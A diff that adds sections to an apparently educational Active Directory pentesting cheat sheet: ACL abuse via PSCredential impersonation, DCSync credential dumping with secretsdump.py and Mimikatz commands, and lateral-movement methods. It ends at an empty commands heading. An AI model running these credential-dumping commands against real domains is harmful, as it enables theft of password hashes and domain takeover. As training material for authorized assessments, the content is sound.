@@ -1132,3 +1132,83 @@ InheritedObjectAceType : All
 OpaqueLength           : 0
 ```
 
+## ACL Abuse Tactics
+
+**Tools:**
+
+- [PSCredential object](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0)
+- [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
+- [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
+
+**Commands:**
+
+ [PSCredential object](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0) - opening a PowerShell console and authenticating as another user:
+
+```powershell
+PS C:\> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
+PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('{DOMAIN}\{USER}', $SecPassword) 
+```
+
+## DCSync
+
+**Tools:**
+
+- secretsdump.py
+- Mimikatz
+- Invoke-DCSync
+
+**Commands:**
+
+secretsdump.py:
+
+```bash
+secretsdump.py -outputfile FILE.TXT -just-dc '{DOMAIN}/{USER}:{PASS}@{IP}'
+```
+
+**NOTE:** The `-just-dc` flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.
+
+Mimikatz:
+
+```powershell
+PS C:\> .\mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # lsadump::dcsync /domain:{DOMAIN}
+```
+
+Mimikatz - Specify user:
+
+```powershell
+PS C:\> .\mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # lsadump::dcsync /domain:{DOMAIN} /user:{USER}
+```
+
+# Stacking The Deck
+
+## Privileged Access
+
+Once we gain a foothold in the domain, our goal shifts to advancing  our position further by moving laterally or vertically to obtain access  to other hosts, and eventually achieve domain compromise or some other  goal, depending on the aim of the assessment. To achieve this, there are several ways we can move laterally. Typically, if we take over an  account with local admin rights over a host, or set of hosts, we can  perform a `Pass-the-Hash` attack to authenticate via the SMB protocol.
+
+**But what if we don't yet have local admin rights on any hosts in the domain?**
+
+There are several other ways we can move around a Windows domain:
+
+- `Remote Desktop Protocol` (`RDP`) - is a remote access/management protocol that gives us GUI access to a target host
+- [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2) - also referred to as PSRemoting or Windows Remote Management (WinRM)  access, is a remote access protocol that allows us to run commands or  enter an interactive command-line session on a remote host using  PowerShell
+- `MSSQL Server` - an account with sysadmin privileges on an SQL Server instance can log into the instance remotely and execute  queries against the database. This access can be used to run operating  system commands in the context of the SQL Server service account through various methods
+
+We can enumerate this access in various ways. The easiest, once  again, is via BloodHound, as the following edges exist to show us what  types of remote access privileges a given user has:
+
+- [CanRDP](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp)
+- [CanPSRemote](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote)
+- [SQLAdmin](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin)
+
+We can also enumerate these privileges using tools such as PowerView and even built-in tools.
+
+**Tools:**
+
+- mssqlclient.py
+- evil-winrm
+- PowerUpSQL.ps1
+
+**Commands:**
